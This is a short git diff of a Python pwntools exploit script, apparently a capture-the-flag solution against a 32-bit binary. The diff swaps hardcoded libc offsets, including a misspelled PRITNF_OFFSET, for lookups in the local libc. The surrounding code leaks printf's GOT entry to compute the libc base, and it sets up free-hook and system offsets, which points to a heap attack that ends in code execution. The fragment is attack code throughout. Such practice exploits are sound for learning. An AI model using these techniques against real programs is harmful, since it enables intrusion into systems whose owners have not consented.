@@ -10,10 +10,12 @@ import re
 
 from pwn import *
 
+libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+
 # from the binary
-PRITNF_OFFSET = 0x49670
-SYSTEM_OFFSET = 0x3ada0
 FREE_HOOK_OFFSET = 0x71476 + 0x140b8a - 0x9c
+PRINTF_OFFSET = libc.symbols['printf']
+SYSTEM_OFFSET = libc.symbols['system']
 
 # will calculate from the leaked addresses
 FREE_HOOK_PTR = 0
@@ -108,7 +110,7 @@ if __name__ == "__main__":
     add_leak(0x804d010, groom=0x200)
     leaked = parse_ingredient()
     print "printf@GOT: 0x{:08x}".format(leaked)
-    LIBC = leaked - PRITNF_OFFSET
+    LIBC = leaked - PRINTF_OFFSET
     print "libc base address: 0x{:08x}".format(LIBC)
 
     raw_input("continue?")
